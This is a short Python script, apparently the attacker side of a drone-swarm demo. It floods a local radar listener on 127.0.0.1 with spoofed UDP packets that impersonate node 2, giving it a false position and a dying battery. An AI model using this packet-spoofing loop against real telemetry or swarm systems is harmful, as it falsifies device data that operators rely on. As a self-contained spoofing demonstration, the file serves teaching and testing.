import socket
import time

# --- ATTACK VECTOR ---
TARGET_IP = "127.0.0.1"  # Attacking the local radar on the same laptop
UDP_PORT = 5005

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("[ENEMY] Launching Cyber Attack on Swarm (Spoofing Node 2)...")

try:
    while True:
        # 1. Impersonate Node 2 (The ESP-12F)
        fake_id = 2
        
        # 2. Teleport it to enemy territory (top left corner)
        fake_x = 50.0 
        fake_y = 50.0
        
        # 3. Tell the swarm its battery is suddenly dying
        fake_battery = 15 

        # Format: ID,X,Y,BATTERY
        packet = f"{fake_id},{fake_x:.2f},{fake_y:.2f},{fake_battery}"
        
        # Fire the malicious packet
        sock.sendto(packet.encode('utf-8'), (TARGET_IP, UDP_PORT))
        
        print(f"[ATTACK] Injected fake packet: {packet}")
        
        # Overpower the real node by sending data twice as fast
        time.sleep(0.05) 
        
except KeyboardInterrupt:
    print("\n[ENEMY] Attack aborted. Retreating.")
    sock.close()